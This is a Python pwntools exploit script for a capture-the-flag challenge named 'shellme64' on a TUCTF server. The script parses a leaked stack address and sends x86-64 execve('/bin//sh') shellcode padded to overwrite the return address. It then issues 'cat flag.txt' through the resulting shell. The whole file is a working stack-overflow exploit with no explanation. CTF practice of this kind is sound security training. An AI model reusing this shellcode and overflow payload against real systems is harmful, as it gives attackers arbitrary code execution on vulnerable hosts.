from pwn import *

#r = process('./shellme64')
r = remote("chal.tuctf.com", 30507)

resp = r.recv()
address = int(resp[resp.find("this\n") + 5:resp.find(">")], 16)

shellcode = "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"

payload = ""
payload += shellcode
payload += "A" * (40 - len(shellcode))
payload += p64(address)
r.sendline(payload)

r.sendline("cat flag.txt")
print(r.recv())
